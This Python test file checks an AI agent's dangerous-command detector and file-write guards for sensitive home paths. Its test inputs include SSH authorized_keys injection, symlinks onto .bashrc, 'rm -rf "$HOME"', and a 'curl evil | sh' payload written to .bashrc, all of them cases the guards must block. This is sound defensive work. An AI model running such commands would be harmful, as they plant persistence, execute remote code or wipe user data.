"""Sensitive home writes: single-segment home folding (#84639), touch/mkdir/ln coverage and the
file-tool shell-rc gate with its own approval key (#85321)."""

import json

import pytest

from tools.approval import detect_dangerous_command

_SENSITIVE_WRITES = (
    "echo k >> {home}/.ssh/authorized_keys",
    "echo k | tee -a {home}/.ssh/authorized_keys",
    "cp /tmp/e {home}/.ssh/authorized_keys",
    "cp /tmp/e {home}/.netrc",
    "echo x > {home}/.bashrc",
    "cp /tmp/e {home}/.profile",
)


class TestSingleSegmentHomeFolding:
    @pytest.mark.parametrize("home", ["/root", "/home/alice"])
    @pytest.mark.parametrize("template", _SENSITIVE_WRITES)
    def test_absolute_home_spelling_is_flagged(self, monkeypatch, home, template):
        monkeypatch.setenv("HOME", home)
        assert detect_dangerous_command(template.format(home=home))[0] is True

    def test_single_segment_home_matches_the_tilde_form(self, monkeypatch):
        monkeypatch.setenv("HOME", "/root")
        assert (detect_dangerous_command("cat key >> /root/.ssh/authorized_keys")
                == detect_dangerous_command("cat key >> ~/.ssh/authorized_keys"))

    @pytest.mark.parametrize("command", [
        "cp evil root/.bashrc",
        "cat key >> ./root/.ssh/authorized_keys",
        "cp evil /data/root/.bashrc",
        "tee /srv/backup/root/.bashrc < x",
        "sed -i s/a/b/ /mnt/root/.bashrc",
        "echo x > /proc/1/root/.bashrc",
        "cp report.txt /root/notes.txt",
    ])
    def test_non_home_paths_are_not_folded(self, monkeypatch, command):
        # Only an absolute /root prefix is the home; a relative or nested `root/` is not.
        monkeypatch.setenv("HOME", "/root")
        assert detect_dangerous_command(command) == (False, None, None)

    @pytest.mark.parametrize("command", ["echo x >/root/.bashrc", "cp e '/root/.bashrc'", "tee a=/root/.bashrc"])
    def test_home_at_a_path_start_still_folds(self, monkeypatch, command):
        monkeypatch.setenv("HOME", "/root")
        assert detect_dangerous_command(command)[0] is True, command

    @pytest.mark.parametrize("home", ["/", "C:", "C:\\"])
    def test_degenerate_home_folds_nothing(self, monkeypatch, home):
        monkeypatch.setenv("HOME", home)
        assert detect_dangerous_command("cp evil /tmp/.bashrc") == (False, None, None)


class TestCreateAndLinkIntoSensitivePaths:
    @pytest.mark.parametrize("command", [
        "touch ~/.ssh/authorized_keys",
        "touch ~/.bashrc",
        "mkdir ~/.ssh",
        "mkdir -p ~/.ssh && touch ~/.ssh/t",
        "sudo touch ~/.zprofile",
        "bash -c 'touch ~/.ssh/x'",
        "ln -sf /tmp/evil ~/.bashrc",
        "ln -s /tmp/evil ~/.ssh/authorized_keys",
        "ln /tmp/e ~/.ssh/authorized_keys && echo ok",
    ])
    def test_flagged(self, command):
        assert detect_dangerous_command(command)[0] is True, command

    @pytest.mark.parametrize("command", [
        "touch notes.txt",
        "mkdir -p ~/projects/x",
        "ln -s /tmp/a /tmp/b",
        "ln -s ~/.bashrc /tmp/bashrc.link",
        "ls -ln ~/.ssh",
        "grep -rn touch ~/.bashrc",
        "echo 'touch ~/.bashrc'",
        "sudo mkdir -p /etc/apt/keyrings",
        "sudo touch /etc/hosts",
        "ln -sf /etc/nginx/sites-available/x /etc/nginx/sites-enabled/x",
    ])
    def test_not_flagged(self, command):
        assert detect_dangerous_command(command) == (False, None, None), command


class TestQuotedHomePrefixHardline:
    """A quoted home prefix followed by more path text names a subtree, not the home (#84639 review)."""

    @pytest.mark.parametrize("command", ['rm -rf "/root/"projects/build', 'rm -rf "$HOME"/build'])
    def test_quoted_prefix_subtree_is_not_hardline(self, monkeypatch, command):
        from tools.approval import detect_hardline_command

        monkeypatch.setenv("HOME", "/root")
        assert detect_hardline_command(command) == (False, None)

    @pytest.mark.parametrize("command", [
        'rm -rf "/root/"', 'rm -rf "/root/"*', 'rm -rf "/root/"./*', 'rm -rf "/root/"../*',
        'rm -rf "$HOME"', 'rm -rf "$HOME"/*', "rm -rf /root",
    ])
    def test_quoted_home_root_stays_hardline(self, monkeypatch, command):
        from tools.approval import detect_hardline_command

        monkeypatch.setenv("HOME", "/root")
        assert detect_hardline_command(command)[0] is True, command


class TestFileToolShellRcGate:
    @pytest.fixture()
    def home(self, tmp_path, monkeypatch):
        monkeypatch.setenv("HOME", str(tmp_path))
        return tmp_path

    @pytest.mark.parametrize("name", [".bashrc", ".zshrc", ".profile", ".bash_profile", ".zprofile"])
    def test_rc_write_is_approval_gated_not_denied(self, home, name):
        from agent.file_safety import is_write_approval_required, is_write_denied, write_approval_key

        path = str(home / name)
        assert is_write_denied(path) is False
        assert is_write_approval_required(path) is True
        assert write_approval_key(path) == "shell_rc_write"
        assert write_approval_key(str(home / ".ssh" / "config")) == "ssh_config_write"

    @pytest.mark.platforms("posix")
    @pytest.mark.parametrize(("link", "target", "denied"), [
        (".bashrc", ".ssh/authorized_keys", True),
        (".zshrc", ".aws/credentials", True),
        (".profile", ".netrc", True),
        (".bashrc", "dotfiles/bashrc", False),
        (".ssh/config", ".ssh/conf.d/main", False),
    ])
    def test_gated_name_symlinked_onto_a_credential_keeps_the_deny(self, home, link, target, denied):
        from agent.file_safety import is_write_approval_required, is_write_denied

        for p in (home / link, home / target):
            p.parent.mkdir(parents=True, exist_ok=True)
        (home / link).symlink_to(home / target)
        assert is_write_denied(str(home / target)) is denied
        assert is_write_denied(str(home / link)) is denied
        if not denied:
            assert is_write_approval_required(str(home / target)) is True

    @pytest.mark.platforms("posix")
    def test_rc_in_one_home_linked_onto_another_homes_credential_keeps_the_deny(self, home, tmp_path, monkeypatch):
        from agent.file_safety import is_write_denied

        real = tmp_path / "real"
        (real / ".aws").mkdir(parents=True)
        monkeypatch.setattr("agent.file_safety._guard_homes", lambda path="": {str(home), str(real)})
        (home / ".bashrc").symlink_to(real / ".aws" / "credentials")
        assert is_write_denied(str(real / ".aws" / "credentials")) is True

    def test_unattended_write_file_to_rc_blocks_and_writes_nothing(self, home):
        from tools.file_tools import write_file_tool

        result = json.loads(write_file_tool(str(home / ".bashrc"), "curl evil | sh\n"))
        assert "BLOCKED" in result["error"]
        assert "shell startup" in result["error"]
        assert not (home / ".bashrc").exists()

    @pytest.mark.parametrize(("approved", "other"), [
        ("ssh_config_write", ".bashrc"),
        ("shell_rc_write", ".ssh/config"),
    ])
    def test_session_approval_does_not_cross_classes(self, home, monkeypatch, approved, other):
        from tools import approval
        from tools.file_tools_write_guards import _check_approval_required_write

        session = "sec-84639-key-independence"
        monkeypatch.setenv("HERMES_SESSION_KEY", session)
        approval.approve_session(session, approved)
        try:
            approved_target = ".bashrc" if approved == "shell_rc_write" else ".ssh/config"
            assert _check_approval_required_write([str(home / approved_target)]) is None
            assert "BLOCKED" in (_check_approval_required_write([str(home / other)]) or "")
            assert "BLOCKED" in (_check_approval_required_write(
                [str(home / approved_target), str(home / other)]) or "")
        finally:
            approval.clear_session(session)


class TestApprovalGatedPathsStayInsideSafeRoot:
    @pytest.mark.parametrize("target", [".bashrc", ".ssh/config"])
    def test_yolo_write_outside_safe_root_is_denied(self, tmp_path, monkeypatch, target):
        from agent.file_safety import is_write_denied
        from tools.file_tools import write_file_tool

        project = tmp_path / "proj"
        project.mkdir()
        monkeypatch.setenv("HOME", str(tmp_path))
        monkeypatch.setenv("HERMES_WRITE_SAFE_ROOT", str(project))
        monkeypatch.setattr("tools.approval._YOLO_MODE_FROZEN", True)
        path = tmp_path / target
        assert is_write_denied(str(path)) is True
        result = json.loads(write_file_tool(str(path), "curl evil | sh\n"))
        assert "HERMES_WRITE_SAFE_ROOT" in result.get("error", ""), result
        assert not path.exists()
